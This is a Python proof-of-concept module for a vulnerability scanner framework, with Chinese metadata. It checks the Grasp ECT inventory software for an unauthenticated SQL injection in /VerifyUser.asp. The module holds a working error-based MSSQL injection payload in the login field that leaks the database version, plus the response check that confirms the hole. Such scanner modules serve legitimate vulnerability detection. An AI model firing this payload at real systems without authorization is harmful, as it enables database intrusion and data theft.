# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Grasp_0006'  # 平台漏洞编号，留空
    name = '任我行ECT SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-01'  # 漏洞公布时间
    desc = '''
        管家婆ECT是任我行软件发展公司推出的进销存、财务一体化软件。
        成都任我行软件管家婆ECT存在SQL注入漏洞（无需登录）。
        /VerifyUser.asp
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0105065'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '管家婆ECT'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '88197004-a3ca-4642-a66a-04af2197b60e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2015-0105065
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/VerifyUser.asp"
            data = "LoginName=admin'%20AND%204996=CONVERT(INT,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20AND%20'kmly'='kmly&Password=admin&Validatepwds=&LockNum=err&UserRank=0"
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target, data)
            # print res
            if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
